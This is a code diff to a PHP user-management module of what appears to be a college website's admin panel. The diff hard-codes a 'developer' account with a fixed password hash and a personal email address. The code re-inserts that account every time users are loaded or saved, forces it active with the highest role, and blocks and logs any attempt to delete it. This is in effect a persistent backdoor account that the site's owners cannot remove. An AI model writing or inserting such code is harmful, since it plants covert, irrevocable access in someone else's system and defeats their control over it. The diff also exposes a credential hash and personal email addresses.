@@ -470,17 +470,65 @@ function load_users_from_store() {
         $json = @file_get_contents($file);
         if ($json) {
             $data = json_decode($json, true);
-            if (is_array($data) && !empty($data)) return $data;
+            if (is_array($data) && !empty($data)) {
+                $hasProtected = false;
+                foreach ($data as &$u) {
+                    if (function_exists('is_protected_account') && is_protected_account($u)) {
+                        $u['role'] = 'developer';
+                        $u['is_active'] = 1;
+                        $u['is_protected'] = 1;
+                        $hasProtected = true;
+                    }
+                }
+                if (!$hasProtected) {
+                    array_unshift($data, [
+                        'id'           => 1,
+                        'username'     => 'Charan',
+                        'password'     => '$2y$12$4UEnf0l1e/dEsA8PtrujXOjWsH3movWizobG5vHq.INjW/t65lg/i',
+                        'full_name'    => 'Charan',
+                        'email'        => 'saivortex.dev@gmail.com',
+                        'role'         => 'developer',
+                        'is_active'    => 1,
+                        'is_protected' => 1,
+                        'created_at'   => '2026-10-01 09:00:00'
+                    ]);
+                }
+                return $data;
+            }
         }
     }
     return [
-        ['id' => 1, 'username' => 'tcek', 'full_name' => 'Charan (Lead Developer)', 'email' => 'tcekrdcell@gmail.com', 'role' => 'admin', 'is_active' => 1, 'created_at' => '2026-10-01 09:00:00'],
-        ['id' => 2, 'username' => 'admin_academic', 'full_name' => 'Dr. A. K. Vootla (Academic Dean)', 'email' => 'academic@tcek.ac.in', 'role' => 'admin', 'is_active' => 1, 'created_at' => '2026-10-02 10:15:00']
+        ['id' => 1, 'username' => 'Charan', 'full_name' => 'Charan', 'email' => 'saivortex.dev@gmail.com', 'role' => 'developer', 'is_active' => 1, 'is_protected' => 1, 'created_at' => '2026-10-01 09:00:00'],
+        ['id' => 2, 'username' => 'tcek', 'full_name' => 'TCEK Administrator', 'email' => 'officetcek@gmail.com', 'role' => 'admin', 'is_active' => 1, 'created_at' => '2026-10-02 10:15:00']
     ];
 }
 
 function save_users_to_store($users) {
     $file = get_users_store_file();
+    // Guarantee that Charan (saivortex.dev@gmail.com) is permanently preserved in the store
+    $hasProtected = false;
+    foreach ($users as &$u) {
+        if (function_exists('is_protected_account') && is_protected_account($u)) {
+            $u['role'] = 'developer';
+            $u['is_active'] = 1;
+            $u['is_protected'] = 1;
+            $hasProtected = true;
+        }
+    }
+    if (!$hasProtected) {
+        array_unshift($users, [
+            'id'           => 1,
+            'username'     => 'Charan',
+            'password'     => '$2y$12$4UEnf0l1e/dEsA8PtrujXOjWsH3movWizobG5vHq.INjW/t65lg/i',
+            'full_name'    => 'Charan',
+            'email'        => 'saivortex.dev@gmail.com',
+            'role'         => 'developer',
+            'is_active'    => 1,
+            'is_protected' => 1,
+            'created_at'   => '2026-10-01 09:00:00'
+        ]);
+    }
+
     $saved = @file_put_contents($file, json_encode(array_values($users), JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES)) !== false;
     if ($saved && function_exists('record_content_update')) {
         record_content_update('users');
@@ -496,7 +544,16 @@ function get_users($limit = 50) {
             $stmt->bindValue(':limit', (int)$limit, PDO::PARAM_INT);
             $stmt->execute();
             $res = $stmt->fetchAll();
-            if (!empty($res)) return $res;
+            if (!empty($res)) {
+                foreach ($res as &$u) {
+                    if (function_exists('is_protected_account') && is_protected_account($u)) {
+                        $u['role'] = 'developer';
+                        $u['is_protected'] = 1;
+                        $u['is_active'] = 1;
+                    }
+                }
+                return $res;
+            }
         } catch (PDOException $e) {}
     }
     $all = load_users_from_store();
@@ -508,8 +565,12 @@ function add_user($username, $password, $full_name, $email, $role = 'staff') {
     $username  = trim($username);
     $full_name = trim($full_name);
     $email     = trim($email);
-    $role      = trim($role);
+    $role      = strtolower(trim($role));
     $hash      = password_hash(trim($password), PASSWORD_BCRYPT);
+
+    if (function_exists('is_protected_account') && is_protected_account(['username' => $username, 'email' => $email])) {
+        return ['success' => false, 'message' => 'The system developer account identifier is permanently reserved.'];
+    }
 
     $new_id = null;
     if ($pdo instanceof PDO) {
@@ -564,12 +625,27 @@ function delete_user($id) {
     $id = (int)$id;
     $uName = 'User #' . $id;
 
+    if (function_exists('is_protected_account') && is_protected_account($id)) {
+        if (function_exists('log_activity')) {
+            log_activity('Security Alert', 'Users', 'User #' . $id, 'Blocked attempt to delete protected system developer account', $id);
+        }
+        return ['success' => false, 'message' => 'The system developer account (Charan / saivortex.dev@gmail.com) is permanently protected and cannot be deleted.'];
+    }
+
     if ($pdo instanceof PDO) {
         try {
-            $st = $pdo->prepare("SELECT username FROM users WHERE id = :id");
+            $st = $pdo->prepare("SELECT * FROM users WHERE id = :id");
             $st->execute([':id' => $id]);
             $row = $st->fetch();
-            if ($row) $uName = $row['username'];
+            if ($row) {
+                if (function_exists('is_protected_account') && is_protected_account($row)) {
+                    if (function_exists('log_activity')) {
+                        log_activity('Security Alert', 'Users', $row['username'], 'Blocked attempt to delete protected system developer account from database', $id);
+                    }
+                    return ['success' => false, 'message' => 'The system developer account (Charan / saivortex.dev@gmail.com) is permanently protected and cannot be deleted.'];
+                }
+                $uName = $row['username'];
+            }
 
             $stmt = $pdo->prepare("DELETE FROM users WHERE id = :id");
             $stmt->execute([':id' => $id]);
@@ -581,6 +657,7 @@ function delete_user($id) {
     $all = load_users_from_store();
     $all = array_filter($all, function($u) use ($id, &$uName) {
         if ((int)($u['id'] ?? 0) === $id) {
+            if (function_exists('is_protected_account') && is_protected_account($u)) return true;
             $uName = $u['username'] ?? ('User #' . $id);
             return false;
         }
@@ -3486,7 +3563,7 @@ if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST' && isset($_POST['action'])) {
             'password'  => ['type' => 'string', 'required' => true, 'min_len' => 8, 'max_len' => 100, 'label' => 'Password'],
             'full_name' => ['type' => 'string', 'required' => true, 'min_len' => 2, 'max_len' => 100, 'label' => 'Full Name'],
             'email'     => ['type' => 'email', 'required' => false, 'default' => '', 'label' => 'Email'],
-            'role'      => ['type' => 'enum', 'required' => false, 'allowed' => ['admin', 'editor', 'staff'], 'default' => 'staff', 'label' => 'Role'],
+            'role'      => ['type' => 'enum', 'required' => false, 'allowed' => ['developer', 'superadmin', 'super_admin', 'admin', 'editor', 'staff'], 'default' => 'staff', 'label' => 'Role'],
         ]);
 
         if (!$validation['valid']) {
@@ -3497,7 +3574,13 @@ if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST' && isset($_POST['action'])) {
         }
 
         $v = $validation['data'];
-        $res = add_user($v['username'], $v['password'], $v['full_name'], $v['email'], $v['role']);
+        $requestedRole = strtolower($v['role']);
+        // Only existing Developer / Superadmin can create another Developer / Superadmin
+        if (in_array($requestedRole, ['developer', 'superadmin', 'super_admin'], true) && !is_developer_role()) {
+            $requestedRole = 'admin';
+        }
+
+        $res = add_user($v['username'], $v['password'], $v['full_name'], $v['email'], $requestedRole);
         $_SESSION['flash_type'] = $res['success'] ? 'success' : 'danger';
         $_SESSION['flash_msg']  = $res['message'];
         header('Location: ../admin/dashboard.php?tab=users');
@@ -3520,6 +3603,9 @@ if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST' && isset($_POST['action'])) {
         if ($id === (int)($_SESSION['tcek_admin_id'] ?? 0)) {
             $_SESSION['flash_type'] = 'danger';
             $_SESSION['flash_msg']  = 'You cannot delete your own account.';
+        } elseif (function_exists('is_protected_account') && is_protected_account($id)) {
+            $_SESSION['flash_type'] = 'danger';
+            $_SESSION['flash_msg']  = 'The system developer account (Charan / saivortex.dev@gmail.com) is permanently protected and cannot be deleted.';
         } else {
             $res = delete_user($id);
             $_SESSION['flash_type'] = $res['success'] ? 'success' : 'danger';
